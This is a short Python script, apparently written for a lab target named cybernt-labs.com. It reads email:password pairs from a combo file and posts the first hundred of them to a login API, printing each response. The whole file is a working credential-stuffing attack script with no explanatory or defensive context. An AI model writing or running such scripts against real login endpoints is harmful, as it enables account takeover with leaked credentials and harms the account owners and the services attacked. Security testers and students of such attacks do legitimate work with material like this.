import requests

url = "https://cybernt-labs.com/login/api"

with open("combined.txt") as f:
    x = f.readlines()
    emails = []
    pwds = []
    for y in x:
        emails.append(y.split(":")[0])
        pwds.append(y.split(":")[1].split('\n')[0])
    i = 0
    while i <= 99:
        resp = requests.post(url, data={"email": emails[i], "password": pwds[i]})
        print(resp.text)
        i += 1
